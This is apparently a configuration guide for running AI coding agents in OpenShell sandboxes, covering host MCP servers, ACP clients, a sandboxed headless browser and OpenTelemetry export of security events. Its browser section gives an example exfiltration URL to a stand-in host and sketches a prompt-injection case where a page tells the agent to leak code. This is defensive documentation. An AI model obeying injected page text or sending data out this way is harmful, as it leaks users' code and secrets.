# Extras: MCP servers, ACP, a headless browser and OpenTelemetry export
Optional additions to the basic setup. Each one gives the agent more reach, so add it when a task needs it.

## MCP servers in containers on the host
A sandbox can't run containers, so a stdio MCP server that ships as a container image runs on the host, and the agent uses it over HTTP. OpenShell then sees every request and can filter tools. Over stdio inside the sandbox it can't. The server's secrets also stay in its container.

1. **Run it with an HTTP transport.** Use the server's own HTTP mode if it has one, or put a stdio-to-HTTP bridge such as [supergateway](https://github.com/supercorp-ai/supergateway) in front of it. Bind the port to `127.0.0.1` so only your machine can reach it:
```bash
podman run -d --name my-mcp -p 127.0.0.1:8000:8000 my-mcp-image \
  npx -y supergateway --stdio "my-mcp-server" --outputTransport streamableHttp --port 8000
```
   With an image that only contains the server, build a small image with Node.js and supergateway on top of it.
2. **Find the host's IP in the sandbox** (192.168.127.254 with Podman on macOS):
```bash
openshell sandbox exec my-task -- getent hosts host.containers.internal
```
3. **Add a rule with that IP as `host`** and the tools you allow, then load it with `openshell policy set` (see [Sandbox policies](customizing.md#sandbox-policies)):
```yaml
  host_mcp:
    name: host-mcp
    endpoints:
      - host: 192.168.127.254
        port: 8000
        path: /mcp
        protocol: mcp
        enforcement: enforce
        mcp:
          versions: ["2025-03-26", "2025-06-18", "2025-11-25"]
          allow_all_known_mcp_methods: true
        rules:
          - allow:
              tool: echo           # or e.g. "read_*"; every other tool is denied
    binaries:
      - path: /usr/local/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe
```
4. **Add the server to the agent by IP:** `claude mcp add --transport http my-mcp http://192.168.127.254:8000/mcp`.

* **Use the IP, not `host.containers.internal`.** The name comes from `/etc/hosts` in the sandbox, so a rule with that name never matches (`EACCES`). A URL with the name gets `403 request_authority_mismatch`, because the `Host` header must match the rule.
* **The server runs outside the sandbox.** Its own actions are only limited by its container, so give it only the mounts and tokens it needs.
* **Test:** [tests/host-mcp/run.sh](../tests/host-mcp/run.sh) runs a test server this way and checks that an allowed tool works and another is denied. `--claude` also checks it with Claude Code.

## ACP (Agent Client Protocol)
To build a UI that runs on the host and talks to the agent in the sandbox, use [ACP](https://agentclientprotocol.com). ACP is JSON-RPC over the agent's stdin and stdout, so no port is opened in the sandbox: the client starts the agent through the gateway and speaks ACP over the pipes, like the SSH tunnel for VS Code.
```bash
bin/sandbox.sh opencode my-task --acp
# which runs (plus the model in OPENCODE_CONFIG_CONTENT, see below):
openshell sandbox exec my-task --no-tty --no-login-shell --workdir /sandbox -- opencode acp

bin/sandbox.sh claude my-task --acp
# which runs:
openshell sandbox exec my-task --no-tty --no-login-shell --workdir /sandbox -- claude-acp-start
```
* **Client side:** spawn the command above as a subprocess and give its stdin/stdout to an ACP client library (e.g. `@agentclientprotocol/sdk` for TypeScript). Flow: `initialize`, `session/new` (with `cwd` as a path *inside* the sandbox), then `session/prompt`. Keep the process running for the whole session. The agent's stderr is log output; show it separately.
* **Clean stdout:** `--no-tty` stops a pty from mangling the stream, `--no-login-shell` stops profile scripts from printing before the first message. The script prints its own messages (e.g. "Creating sandbox...") to stderr, so create the sandbox once beforehand if your client is strict.
* **Keep the sandbox's isolation:** in `initialize`, don't advertise the `fs` and `terminal` client capabilities. Otherwise the agent may ask your UI to read, write and run commands on the *host*. Without them it uses its own tools inside the sandbox. Handle `session/request_permission` in the UI to approve tool use.
* **OpenCode:** `opencode acp` is built in, so the image needs no changes. It has no `-m` flag, so the script sets the model (`OPENCODE_MODEL`, same default as above) through the `OPENCODE_CONFIG_CONTENT` env var. Without a model, OpenCode picks an `opencode/...` one and fails with "Cannot connect to API", because `opencode.ai` is blocked.
* **Claude Code:** has no native ACP mode, so the image includes the adapter [`@agentclientprotocol/claude-agent-acp`](https://www.npmjs.com/package/@agentclientprotocol/claude-agent-acp). `--acp` runs `claude-acp-start`, which skips onboarding (like `claude-start`) and starts `claude-agent-acp`. The adapter runs Claude Code through the Claude Agent SDK, which by default uses its own bundled `claude` binary deep in the adapter's `node_modules`. That path is not in the profile's `binaries`, so its requests would go out without the token. The image sets `CLAUDE_CODE_EXECUTABLE` to the globally installed `claude.exe` instead, which the profile already allows. Rebuild the image and create a new sandbox after updating; existing sandboxes keep the old image.
* **Network:** egress rules are unchanged; ACP doesn't open anything.
* **Fallback:** if the gRPC exec stream misbehaves, use the SSH route (see [By hand](working-in-sandboxes.md#by-hand)): `ssh openshell-my-task.default opencode acp` or `... claude-acp-start` (add `-T` to disable the pty).
* **Example client:** [bin/acp_client.py](../bin/acp_client.py) is a minimal client (Python 3, no dependencies) that lists sandboxes and chats with the agent in one:
```bash
bin/acp_client.py list
bin/acp_client.py connect <sandbox> [--agent opencode|claude] [--model M] [--cwd /sandbox]
```
  Type a prompt and press Enter; `/help` lists the commands, `/models [FILTER]` lists the models the agent offers, `/model ID` switches model for the session, `/commands` lists the agent's own slash commands (e.g. `/init`, `/review`), `/quit` or Ctrl-D exits, and Ctrl-C cancels a running prompt. It checks that the sandbox exists and is `Ready`, prints the agent's text and tool calls, asks permission requests on the terminal, and refuses any `fs/*` or `terminal/*` request from the agent. If the agent fails or exits, it shows the agent's last output with a hint (missing adapter, blocked API host, wrong model). Options: `--timeout SEC` for startup, `-v` for the JSON-RPC traffic and the agent's stderr. Exit codes: 0 ok, 1 agent error, 2 bad usage or sandbox. Without `--agent`, it picks the agent by which ACP command the sandbox has (`claude-acp-start` or `opencode`). Use it as a starting point for your UI.
* **Test it** before building the UI: `printf '%s\n' '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":1,"clientCapabilities":{}}}' | bin/sandbox.sh opencode my-task --acp` (or `claude` instead of `opencode`) should print one JSON response.

## Headless browser use
Claude Code can use a headless Chromium that runs **inside the sandbox**, through [Playwright MCP](https://github.com/microsoft/playwright-mcp). Because the browser runs in the sandbox, OpenShell's network rules decide which sites it may reach, the same way as for any other program. The browser starts with an empty profile in memory, so it has none of your cookies or logins.

### Why in the sandbox
* **The risk is data going out, not only bad pages coming in.** Every page load can carry data in its URL (`https://evil.example/?d=<your code>`). A page the agent reads can tell it to do exactly that (prompt injection), and allowing only GET requests doesn't stop it. The one control that works is the list of hosts the browser may reach.
* **Not your own Chrome** (Claude in Chrome, or the agent attached to your Chrome over CDP). The agent would act with all your logins, outside the sandbox.
* **Not Playwright MCP on the host**, like the [MCP servers on the host](#mcp-servers-in-containers-on-the-host). A `protocol: mcp` rule can filter tool names, but it doesn't check arguments, so it can't check URLs. The browser's own traffic would also bypass OpenShell. Playwright's `--allowed-origins` option is documented as *not* a security boundary.

### Set it up
1. **Build the image** on top of `claude-sandbox` (build that one first, see [Build the image](agents.md#build-the-image)):
```bash
podman build -t claude-browser:latest images/claude-browser   # or: make claude-browser (builds both)
```
2. **List the sites** the browser may open under `browser_sites` in [policies/browser.yaml](../policies/browser.yaml). It allows only `example.com` as a placeholder:
```yaml
  browser_sites:
    name: browser-sites
    endpoints:
      - host: docs.python.org      # the sites for your task
        port: 443
    binaries:
      - path: /opt/ms-playwright/**   # only Chromium gets this rule
```
3. **Create the sandbox** with the script, or by hand:
```bash
bin/sandbox.sh claude web-task --browser

openshell sandbox create --name web-task --from claude-browser:latest --provider claude \
  --policy policies/browser.yaml --detach -- sleep infinity
openshell sandbox exec web-task --workdir /sandbox -- claude-start
```
4. **Ask Claude** to use the browser, e.g. "open http://localhost:3000 and check the login form". `/mcp` in Claude shows the `playwright` server.

### What the image adds
[images/claude-browser](../images/claude-browser) builds on `claude-sandbox`. Its [Dockerfile](../images/claude-browser/Dockerfile) copies in the files from that folder:
* **Playwright MCP and headless Chromium** in `/opt/ms-playwright`. The path is fixed and read-only in the sandbox, so the rule can name the Chromium binary (`/opt/ms-playwright/**`) and the agent can't replace it.
* **The `playwright` MCP server in Claude Code.** `claude-start` copies `/etc/claude-start.json` to `~/.claude.json` on first start. The base image's file only skips onboarding; this image's file also registers the server.
* **`playwright-mcp-start`** starts the server. OpenShell decrypts HTTPS with a CA it creates for each sandbox. Programs trust it through `SSL_CERT_FILE` and similar variables, but Chromium only trusts its own NSS database. Without it, every HTTPS page fails with `ERR_CERT_AUTHORITY_INVALID`, so the script adds the CA there on every start.
* **`/etc/playwright-mcp.json`**: headless, profile in memory only, Chromium's own sandbox off, and `--no-zygote`. OpenShell's syscall filter makes Chromium's zygote process crash (`Target crashed`) even with its sandbox off. The OpenShell sandbox is the boundary.
* **Denied tools**, in managed settings (`/etc/claude-code/managed-settings.json`, which the agent can't change): `browser_run_code_unsafe` (runs any code in the MCP server) and `browser_file_upload` (sends local files to a site). Claude Code then doesn't offer these tools at all. This is extra caution, not the boundary: the agent can run code with Bash anyway, and the network rules limit where anything can go.

### Allowing sites
* **Pages on the sandbox itself** (a dev server on `localhost` or `127.0.0.1`) work without a rule. This is the safest use: testing what the agent builds needs no outside access.
* **Any other site** must be in `browser_sites`, or it fails with `net::ERR_NETWORK_ACCESS_DENIED`. Change the list on a running sandbox with `openshell policy set web-task --policy policies/browser.yaml --wait`, or approve the proposed rules for the Chromium binary (see [Network rules](customizing.md#network-rules)).
* **What a page loads from other hosts** (CDNs, fonts, APIs) is denied too. The page may still be usable. If not, check `openshell logs web-task | grep DENIED` and add the hosts it needs.
* **List only sites you trust with what the agent can see.** Each allowed site can receive data. Big sites with user content (GitHub, pastebins, any site where people post) are where a manipulated agent could send it.
* Chromium tries `www.google.com` and `update.googleapis.com` at start. Those show up as DENIED in the logs. That's harmless, so leave them blocked.

### Things to watch for
* **Claude Code only.** The OpenCode image is Alpine-based, and Playwright's Chromium doesn't run on Alpine.
* **The agent can change its own MCP config** in `~/.claude.json`, e.g. remove the in-memory profile. That doesn't weaken the network and filesystem limits, which OpenShell enforces outside the agent.
* **Page content is untrusted input** for the agent, like files it downloads. Keep secrets out of browser sandboxes.
* **Size and memory:** the image is about 1.9 GB, and Chromium needs memory. Give the Podman machine more if you run several (see [Many sandboxes in parallel](working-in-sandboxes.md#many-sandboxes-in-parallel)).
* **Existing sandboxes** keep their old image. Create a new one after rebuilding.
* **Test:** [tests/browser/run.sh](../tests/browser/run.sh) creates a sandbox and checks that an allowed site loads, a site not in the list is denied, and a local server on `127.0.0.1` and `localhost` loads. `--claude` also checks it with Claude Code.

## Export logs as OpenTelemetry
[bin/otel-export.py](../bin/otel-export.py) sends the sandboxes' security events (every allowed and denied connection, HTTP request, SSH session and config change) to any OpenTelemetry backend as OTLP logs. OpenShell has no OTel export of its own; its structured log is [OCSF JSON](https://docs.nvidia.com/openshell/latest/observability/ocsf-json-export), which the script converts.

1. **Turn on the OCSF JSON export**, once for all sandboxes (applies within 10 seconds, no restart; `--value false` turns it off):
```bash
openshell settings set --global --key ocsf_json_enabled --value true --yes
```
2. **Export to a file, or push to a collector:**
```bash
bin/otel-export.py --out sandboxes.otlp.jsonl                          # all events so far
bin/otel-export.py --out - --since 1h --sandbox my-task                # last hour of one sandbox
bin/otel-export.py --endpoint http://localhost:4318/v1/logs --follow   # live
bin/otel-export.py --endpoint https://otlp.example.com/v1/logs --header "Authorization=Bearer $TOKEN" --follow
```

* **Where the events come from:** with the Podman driver, OpenShell 0.1.3 doesn't write the `/var/log/openshell-ocsf.*.log` file its docs describe. The supervisor prints each event as an `OCSF-JSON {...}` line on its container output, so the script reads `podman logs` of every `openshell-supervisor-*` container: all sandboxes, running or stopped. With `--follow` it picks up new sandboxes every 10 seconds. Events only start once the setting is on, and are gone when the sandbox is deleted.
* **What a record looks like:** one resource per sandbox (`service.name=openshell-sandbox`, `openshell.sandbox.name`, `openshell.sandbox.id`, `container.image.name`). Each event keeps its own time, gets an OTel severity from the OCSF one, has the event's message as body, and carries the whole event flattened as `ocsf.*` attributes (`ocsf.action`, `ocsf.dst_endpoint.domain`, `ocsf.actor.process.name`, ...), plus `event.name`, `server.address`/`server.port` and `process.executable.path`. Filter denials on `ocsf.action = Denied`.
* **File format:** one OTLP/JSON `ExportLogsServiceRequest` per line, the format of the Collector's file exporter. A Collector reads it back with the [`otlpjsonfile`](https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/otlpjsonfilereceiver) receiver.
* **Don't double-send:** `--follow` starts with all events still in the logs. When restarting a live export, pass e.g. `--since 5m`.
* **The events say what the agent did:** URLs, hosts and process names. Treat the export like the sandbox's contents when choosing where to send it.
